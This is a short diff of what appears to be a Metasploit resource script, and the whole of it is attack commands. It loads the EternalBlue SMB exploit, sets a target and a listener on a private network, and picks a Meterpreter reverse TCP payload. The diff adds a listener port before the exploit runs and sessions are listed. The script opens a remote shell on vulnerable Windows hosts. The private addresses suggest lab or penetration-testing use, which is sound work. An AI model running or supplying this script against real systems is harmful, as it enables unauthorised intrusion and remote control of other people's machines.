@@ -3,5 +3,6 @@ use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 192.168.123.22
 set LHOST 192.168.123.19
 set payload windows/x64/meterpreter/reverse_tcp
+set LPORT 1337
 exploit -j -z
 sessions
